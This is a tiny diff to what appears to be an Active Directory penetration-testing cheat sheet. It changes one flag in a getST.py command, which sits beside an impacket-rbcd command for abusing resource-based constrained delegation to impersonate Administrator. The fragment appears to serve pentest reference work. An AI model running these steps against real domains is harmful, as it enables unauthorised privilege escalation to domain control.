@@ -20,7 +20,7 @@
 
  - impacket-rbcd -delegate-from 'COMPUTER$' -delegate-to 'TARGET$' -dc-ip 'DC' -action 'write' DOMAIN/USER:PASSWORD
 
- - getST.py -spn host/DC_FQDN 'DOMAIN/COMPUTER_ACCOUNT:COMPUTER_PASS' -impersonate Administrator --dc-ip DC_IP (Get TGT ticket)
+ - getST.py -spn host/DC_FQDN 'DOMAIN/COMPUTER_ACCOUNT:COMPUTER_PASS' -impersonate Administrator -dc-ip DC_IP (Get TGT ticket)
 
 #### 4) Powermad
 
